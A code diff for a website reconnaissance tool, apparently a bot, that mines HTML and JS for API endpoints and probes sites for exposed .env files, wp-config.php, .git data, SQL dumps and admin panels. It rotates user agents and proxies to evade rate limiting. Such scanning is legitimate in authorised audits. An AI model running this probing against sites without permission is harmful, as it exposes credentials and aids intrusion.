+def _mine_js_bundles(html: str, root: str, proxies) -> list:
+    """External JS files တွေ download ပြီး API URLs ထုတ်"""
+    soup = BeautifulSoup(html, 'html.parser')
+    js_urls = []
+    for tag in soup.find_all('script', src=True):
+        src = tag['src']
+        if not src: continue
+        if src.startswith('//'):
+            src = 'https:' + src
+        elif src.startswith('/'):
+            src = root + src
+        if src.startswith('http') and ('chunk' in src or 'bundle' in src or
+                'main' in src or 'app' in src or 'vendor' in src or 'index' in src):
+            js_urls.append(src)
+
+    found = set()
+    for js_url in js_urls[:8]:   # max 8 JS bundles
+        try:
+            r = requests.get(js_url, headers=HEADERS, timeout=10, verify=False, proxies=proxy_manager.get_proxy())
+            if r.status_code == 200 and len(r.text) > 100:
+                for url in _extract_api_urls_from_js(r.text, root):
+                    found.add(url.split('?')[0])
+        except Exception:
+            pass
+    return list(found)
+
+
+def _check_robots_and_sitemap(root: str, proxies) -> list:
+    """robots.txt / sitemap.xml ထဲက API paths ရှာ"""
+    found = set()
+    # robots.txt — Disallow paths with /api/
+    try:
+        r = requests.get(root + '/robots.txt', headers=HEADERS,
+                         timeout=8, verify=False,
+                         proxies=proxy_manager.get_proxy())
+        if r.status_code == 200:
+            for line in r.text.splitlines():
+                line = line.strip()
+                if line.lower().startswith(('disallow:', 'allow:')):
+                    path = line.split(':', 1)[1].strip()
+                    if any(kw in path for kw in ['/api/', '/rest/', '/v1/', '/v2/', '/graphql']):
+                        found.add(root + path.split('*')[0].rstrip('$'))
+    except Exception:
+        pass
+    return list(found)
+
+
+def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
+    """
+    Comprehensive API discovery:
+    1. Predefined path brute-force (ALL_API_PATHS)
+    2. HTML source mining (data-* attrs, inline scripts)
+    3. JS bundle mining (fetch/axios/url patterns)
+    4. robots.txt / sitemap discovery
+    5. CORS header detection
+    Returns: {"found": [...], "js_mined": [...], "html_mined": [...],
+              "robots": [...], "stats": {...}}
+    """
+    parsed  = urlparse(base_url)
+    root    = f"{parsed.scheme}://{parsed.netloc}"
+
+    # ── Phase 0: Fetch homepage for mining ───────
+    homepage_html = None
+    try:
+        r0 = requests.get(base_url, headers=HEADERS, timeout=12, verify=False,
+                         proxies=proxy_manager.get_proxy())
+        if r0.status_code == 200:
+            homepage_html = r0.text
+    except Exception:
+        pass
+
+    # ── Phase 1: HTML + JS mining (parallel) ─────
+    html_mined = []
+    js_mined   = []
+    robots_found = []
+
+    if homepage_html:
+        if progress_cb: progress_cb("🔍 HTML source mining...")
+        html_mined = _extract_api_urls_from_html(homepage_html, root)
+
+        if progress_cb: progress_cb("📦 JS bundle mining...")
+        js_mined   = _mine_js_bundles(homepage_html, root, None)
+
+    if progress_cb: progress_cb("🤖 robots.txt scanning...")
+    robots_found = _check_robots_and_sitemap(root, None)
+
+    # ── Phase 2: Path brute-force ─────────────────
+    found  = []
+    seen   = set()
+
+    def _probe(path: str) -> dict | None:
+        url = root + path if path.startswith('/') else path
+        try:
+            r = requests.get(
+                url,
+                headers={**HEADERS, 'Accept': 'application/json, text/plain, */*'},
+                timeout=7, verify=False,
+                allow_redirects=True,
+                proxies=proxy_manager.get_proxy()
+            )
+            ct  = r.headers.get('Content-Type', '')
+            cors = r.headers.get('Access-Control-Allow-Origin', '')
+            size = len(r.content)
+
+            endpoint = {
+                "url":    url,
+                "status": r.status_code,
+                "cors":   cors if cors else None,
+                "size_b": size,
+                "preview": "",
+                "type":   "OTHER",
+                "method": "GET",
+            }
+
+            if r.status_code in (401, 403):
+                endpoint["type"] = "PROTECTED"
+                return endpoint
+
+            if r.status_code in (405,):   # Method Not Allowed → endpoint exists
+                endpoint["type"] = "PROTECTED"
+                endpoint["note"] = "POST only"
+                return endpoint
+
+            if r.status_code == 200 and size > 5:
+                body = r.text[:400].strip()
+                if 'json' in ct or body.startswith(('{', '[')):
+                    endpoint["type"]    = "JSON_API"
+                    endpoint["preview"] = body[:150]
+                    # Try to detect if it's GraphQL
+                    if '/graphql' in url or ('"data"' in body and '"errors"' in body):
+                        endpoint["type"] = "GRAPHQL"
+                elif 'xml' in ct or 'rss' in ct or 'atom' in ct:
+                    endpoint["type"]    = "XML/RSS"
+                    endpoint["preview"] = body[:100]
+                elif 'html' in ct and ('/swagger' in url or '/redoc' in url or '/docs' in url):
+                    endpoint["type"]    = "API_DOCS"
+                    endpoint["preview"] = "Swagger/OpenAPI docs"
+                elif size > 20:
+                    endpoint["type"]    = "OTHER"
+                    endpoint["preview"] = body[:80]
+                else:
+                    return None
+                return endpoint
+        except Exception:
+            pass
+        return None
+
+    # ── Probe ALL paths (brute-force) ─────────────
+    # Also probe mined URLs
+    all_probe_paths = list(ALL_API_PATHS)
+    # Add mined paths (path-only)
+    for mined_url in (html_mined + js_mined + robots_found):
+        try:
+            p = urlparse(mined_url).path
+            if p and p not in all_probe_paths and len(p) < 150:
+                all_probe_paths.append(p)
+        except Exception:
+            pass
+
+    total = len(all_probe_paths)
+    if progress_cb:
+        progress_cb(f"🔌 Path scanning: `{escape_md(total)}` paths...")
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
+        fmap = {ex.submit(_probe, path): path for path in all_probe_paths}
+        done = 0
+        for fut in concurrent.futures.as_completed(fmap, timeout=90):
+            done += 1
+            try:
+                result = fut.result(timeout=10)
+                if result and result["url"] not in seen:
+                    seen.add(result["url"])
+                    found.append(result)
+            except Exception:
+                pass
+            if progress_cb and done % 15 == 0:
+                progress_cb(
+                    f"🔌 Scanning: `{done}/{total}`\n"
+                    f"✅ JSON: `{sum(1 for e in found if e['type']=='JSON_API')}` | "
+                    f"🔒 Protected: `{sum(1 for e in found if e['type']=='PROTECTED')}` | "
+                    f"📰 RSS: `{sum(1 for e in found if e['type']=='XML/RSS')}`"
+                )
+
+    _type_order = {"JSON_API": 0, "GRAPHQL": 1, "XML/RSS": 2,
+                   "API_DOCS": 3, "PROTECTED": 4, "OTHER": 5}
+    found.sort(key=lambda x: _type_order.get(x["type"], 9))
+
+    return {
+        "found":       found,
+        "js_mined":    list(set(js_mined)),
+        "html_mined":  list(set(html_mined)),
+        "robots":      robots_found,
+        "stats": {
+            "total_probed":   total,
+            "json_apis":      sum(1 for e in found if e["type"] == "JSON_API"),
+            "graphql":        sum(1 for e in found if e["type"] == "GRAPHQL"),
+            "xml_rss":        sum(1 for e in found if e["type"] == "XML/RSS"),
+            "api_docs":       sum(1 for e in found if e["type"] == "API_DOCS"),
+            "protected":      sum(1 for e in found if e["type"] == "PROTECTED"),
+            "other":          sum(1 for e in found if e["type"] == "OTHER"),
+            "js_urls_found":  len(js_mined),
+            "html_urls_found":len(html_mined),
+        }
+    }
+
+
+
+def get_internal_links(html: str, base_url: str) -> set:
+    soup    = BeautifulSoup(html, 'html.parser')
+    netloc  = urlparse(base_url).netloc
+    links   = set()
+    for a in soup.find_all('a', href=True):
+        h = a['href']
+        if h.startswith(('#','mailto:','tel:','javascript:')): continue
+        full = urljoin(base_url, h)
+        p    = urlparse(full)
+        if p.netloc == netloc:
+            links.add(p._replace(fragment='').geturl())
+    return links
+
+
+
+# ══════════════════════════════════════════════════
+# ✂️  FILE SPLITTER
+# ══════════════════════════════════════════════════
+
+def split_zip(zip_path: str, part_mb: float = SPLIT_MB) -> list:
+    part_size = int(part_mb * 1024 * 1024)
+    base  = zip_path.replace('.zip','')
+    parts = []
+    num   = 1
+    with open(zip_path,'rb') as f:
+        while True:
+            chunk = f.read(part_size)
+            if not chunk: break
+            p = f"{base}.part{num:02d}.zip"
+            with open(p,'wb') as pf: pf.write(chunk)
+            parts.append(p)
+            num += 1
+    return parts
+
+def needs_split(path: str) -> bool:
+    return os.path.getsize(path) > SPLIT_MB * 1024 * 1024
+
+
+# ══════════════════════════════════════════════════
+# 🛡️  VULNERABILITY SCANNER  v4
+#     - Cloudflare catch-all detection
+#     - Baseline fingerprint comparison
+#     - Adaptive delay (anti-rate-limit)
+#     - Real subdomain verification
+# ══════════════════════════════════════════════════
+
+_COMMON_SUBDOMAINS = [
+    "api", "admin", "dev", "staging", "test",
+    "beta", "app", "portal", "dashboard", "panel",
+    "manage", "backend", "internal", "static",
+    "mail", "backup", "vpn", "git", "gitlab",
+    "jenkins", "ci", "build", "docs", "help",
+    "shop", "store", "blog", "status", "monitor",
+    "db", "database", "phpmyadmin", "cdn", "media",
+    "assets", "files", "upload", "img", "images",
+    "auth", "login", "sso", "oauth", "api2",
+]
+
+_VULN_PATHS = [
+    # CRITICAL — Credentials
+    ("/.env",                     "🔑 .env file",               "CRITICAL"),
+    ("/.env.local",               "🔑 .env.local",              "CRITICAL"),
+    ("/.env.backup",              "🔑 .env.backup",             "CRITICAL"),
+    ("/.env.production",          "🔑 .env.production",         "CRITICAL"),
+    ("/wp-config.php",            "🔑 wp-config.php",           "CRITICAL"),
+    ("/wp-config.php.bak",        "🔑 wp-config.php.bak",       "CRITICAL"),
+    ("/config.php",               "🔑 config.php",              "HIGH"),
+    ("/config.yml",               "🔑 config.yml",              "HIGH"),
+    ("/config.json",              "🔑 config.json",             "HIGH"),
+    ("/database.yml",             "🔑 database.yml",            "HIGH"),
+    ("/settings.py",              "🔑 settings.py",             "HIGH"),
+    # CRITICAL — VCS
+    ("/.git/config",              "📁 .git/config",             "CRITICAL"),
+    ("/.git/HEAD",                "📁 .git/HEAD",               "CRITICAL"),
+    ("/.svn/entries",             "📁 .svn entries",            "HIGH"),
+    # CRITICAL — Backups
+    ("/backup.zip",               "🗜️ backup.zip",              "CRITICAL"),
+    ("/backup.sql",               "🗜️ backup.sql",              "CRITICAL"),
+    ("/dump.sql",                 "🗜️ dump.sql",                "CRITICAL"),
+    ("/db.sql",                   "🗜️ db.sql",                  "CRITICAL"),
+    ("/backup.tar.gz",            "🗜️ backup.tar.gz",           "CRITICAL"),
+    ("/site.zip",                 "🗜️ site.zip",                "HIGH"),
+    # HIGH — Admin panels
+    ("/phpmyadmin/",              "🔐 phpMyAdmin",              "HIGH"),
+    ("/pma/",                     "🔐 phpMyAdmin /pma/",        "HIGH"),
+    ("/adminer.php",              "🔐 Adminer DB UI",           "HIGH"),
+    ("/admin",                    "🔐 Admin Panel",             "MEDIUM"),
+    ("/admin/",                   "🔐 Admin Panel",             "MEDIUM"),
+    ("/admin/login",              "🔐 Admin Login",             "MEDIUM"),
+    ("/wp-admin/",                "🔐 WordPress Admin",         "MEDIUM"),
+    ("/administrator/",           "🔐 Joomla Admin",            "MEDIUM"),
+    ("/dashboard",                "🔐 Dashboard",               "MEDIUM"),
+    ("/login",                    "🔐 Login Page",              "LOW"),
+    # HIGH — Logs
+    ("/error.log",                "📋 error.log",               "HIGH"),
+    ("/access.log",               "📋 access.log",              "HIGH"),
+    ("/debug.log",                "📋 debug.log",               "HIGH"),
+    ("/storage/logs/laravel.log", "📋 Laravel log",             "HIGH"),
+    # MEDIUM — Server info
+    ("/server-status",            "⚙️ Apache server-status",   "MEDIUM"),
+    ("/web.config",               "⚙️ web.config",             "HIGH"),
+    ("/.htaccess",                "⚙️ .htaccess",              "MEDIUM"),
+    ("/xmlrpc.php",               "⚠️ xmlrpc.php",             "MEDIUM"),
+    # LOW
+    ("/composer.json",            "📦 composer.json",           "LOW"),
+    ("/package.json",             "📦 package.json",            "LOW"),
+    ("/requirements.txt",         "📦 requirements.txt",        "LOW"),
+    # INFO
+    ("/robots.txt",               "🤖 robots.txt",              "INFO"),
+    ("/sitemap.xml",              "🗺️ sitemap.xml",             "INFO"),
+]
+
+_SEV_EMOJI = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🔵","INFO":"⚪"}
+_SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
+_SEC_HEADERS = {
+    "Strict-Transport-Security": ("HSTS",           "HIGH"),
+    "Content-Security-Policy":   ("CSP",            "MEDIUM"),
+    "X-Frame-Options":           ("X-Frame-Options","MEDIUM"),
+    "X-Content-Type-Options":    ("X-Content-Type", "LOW"),
+    "Referrer-Policy":           ("Referrer-Policy","LOW"),
+    "Permissions-Policy":        ("Permissions-Policy","LOW"),
+}
+_FAKE_SIGS = [
+    b"404", b"not found", b"page not found",
+    b"does not exist", b"no such file",
+]
+
+# User-Agents rotation (avoid rate limiting) — 60+ UAs for better evasion (updated 2025/2026)
+_UA_LIST = [
+    # ── Chrome — Windows (latest) ────────────────────────────────────
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+    # ── Chrome — Windows (slightly older, still common) ──────────────
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.185 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36',
+    # ── Chrome — macOS ───────────────────────────────────────────────
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+    # ── Chrome — Linux ───────────────────────────────────────────────
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+    # ── Firefox — Windows ────────────────────────────────────────────
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
+    # ── Firefox — macOS ──────────────────────────────────────────────
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:138.0) Gecko/20100101 Firefox/138.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:128.0) Gecko/20100101 Firefox/128.0',
+    # ── Firefox — Linux ──────────────────────────────────────────────
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
+    # ── Safari — macOS ───────────────────────────────────────────────
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
+    # ── Edge — Windows ───────────────────────────────────────────────
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
+    # ── Mobile — Android Chrome ──────────────────────────────────────
+    'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.137 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.79 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; RMX3890) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36',
+    # ── Mobile — iOS Safari ──────────────────────────────────────────
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+    # ── iPad ─────────────────────────────────────────────────────────
+    'Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
+    # ── Opera ─────────────────────────────────────────────────────────
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
+    # ── Brave (Chrome-based) ──────────────────────────────────────────
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+    # ── Mobile Firefox ───────────────────────────────────────────────
+    'Mozilla/5.0 (Android 15; Mobile; rv:138.0) Gecko/138.0 Firefox/138.0',
+    'Mozilla/5.0 (Android 14; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0',
+    'Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0',
+    # ── Samsung Internet ─────────────────────────────────────────────
+    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36',
+]
+
+
+def _get_headers() -> dict:
+    """Rotate User-Agent each call with realistic browser headers."""
+    ua = random.choice(_UA_LIST)
+    is_mobile = 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua or 'iPad' in ua
+    return {
+        'User-Agent': ua,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': random.choice([
+            'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.5',
+            'en-US,en;q=0.9,fr;q=0.8', 'en-US,en;q=0.9,de;q=0.8',
+        ]),
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User': '?1',
+        'Cache-Control': 'max-age=0',
+        **({"Sec-CH-UA-Mobile": "?1"} if is_mobile else {"Sec-CH-UA-Mobile": "?0"}),
+    }
+
+
+def _get_page_fingerprint(url: str, timeout: int = 6) -> tuple:
+    """
+    Get (status_code, body_hash, content_length) for baseline comparison.
+    Used to detect catch-all pages.
+    """
+    try:
+        resp = requests.get(url, headers=_get_headers(), timeout=timeout,
+                            stream=True, allow_redirects=True, verify=False,
+                            proxies=proxy_manager.get_proxy())
+        status = resp.status_code
+        chunk  = b''
+        for part in resp.iter_content(1024):
+            chunk += part
+            if len(chunk) >= 1024: break
+        resp.close()
+        body_hash = hashlib.md5(chunk[:512]).hexdigest()
+        ct_length = int(resp.headers.get('Content-Length', len(chunk)))
+        return status, body_hash, ct_length, resp.headers.get('Content-Type','')
+    except Exception:
+        return 0, '', 0, ''
+
+
+def _detect_catchall(base_url: str) -> tuple:
+    """
+    Request a random non-existent path — if it returns 200,
+    the server has a catch-all (Cloudflare, custom 404 as 200).
+    Returns (is_catchall: bool, baseline_hash: str, baseline_len: int)
+    """
+    rand_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=16)) + '.html'
+    status, body_hash, ct_len, ct = _get_page_fingerprint(base_url.rstrip('/') + rand_path)
+    if status == 200:
+        return True, body_hash, ct_len   # catch-all confirmed
+    return False, '', 0
+
+
+def _is_fake_200_content(body: bytes, ct: str) -> bool:
+    if 'html' not in ct.lower():
+        return False
+    snippet = body[:800].lower()
+    return any(s in snippet for s in _FAKE_SIGS)
+
+
+def _probe_one(
+    base_url: str, path: str, label: str, severity: str,
+    catchall: bool, baseline_hash: str, baseline_len: int,
+    delay: float = 0.0
+) -> dict | None:
+    """
+    Probe one path — GET + stream.
+    Compares against baseline to filter catch-all false positives.
+    """
+    if delay > 0:
+        time.sleep(delay)
+
+    full_url = base_url.rstrip('/') + path
+    try:
+        resp = requests.get(
+            full_url, headers=_get_headers(),
+            timeout=8, stream=True,
+            allow_redirects=True, verify=False,
+            proxies=proxy_manager.get_proxy(),
+        )
+        status = resp.status_code
+        ct     = resp.headers.get('Content-Type', '')
+
+        if status == 200:
+            chunk = b''
+            for part in resp.iter_content(1024):
+                chunk += part
+                if len(chunk) >= 1024: break
+            resp.close()
+
+            # ── Catch-all filter ──────────────────
+            if catchall:
+                page_hash = hashlib.md5(chunk[:512]).hexdigest()
+                page_len  = int(resp.headers.get('Content-Length', len(chunk)))
+                # Same hash or very similar length = catch-all page
+                if page_hash == baseline_hash:
+                    return None
+                if baseline_len > 0 and abs(page_len - baseline_len) < 50:
+                    return None
+
+            # ── Fake 200 (custom 404 HTML) ────────
+            if _is_fake_200_content(chunk, ct):
+                return None
+
+            size = int(resp.headers.get('Content-Length', len(chunk)))
+            return {
+                "path": path, "full_url": full_url,
+                "label": label, "severity": severity,
+                "status": 200, "protected": False, "size": size,
+            }
+
+        elif status == 403 and severity in ("CRITICAL","HIGH"):
+            resp.close()
+            # Cloudflare 403 = file might exist but CF blocks it
+            cf = 'cloudflare' in resp.headers.get('Server','').lower() or\
+                 'cf-ray' in resp.headers
+            note = " (CF-blocked)" if cf else ""
+            return {
+                "path": path, "full_url": full_url,
+                "label": label + note, "severity": "MEDIUM",
+                "status": 403, "protected": True, "size": 0,
+            }
+
+        elif status in (301,302,307,308):
+            loc = resp.headers.get('Location','')
+            resp.close()
+            if severity in ("HIGH","MEDIUM","LOW") and any(
+                k in loc for k in ('login','auth','signin','session')
+            ):
+                return {
+                    "path": path, "full_url": full_url,
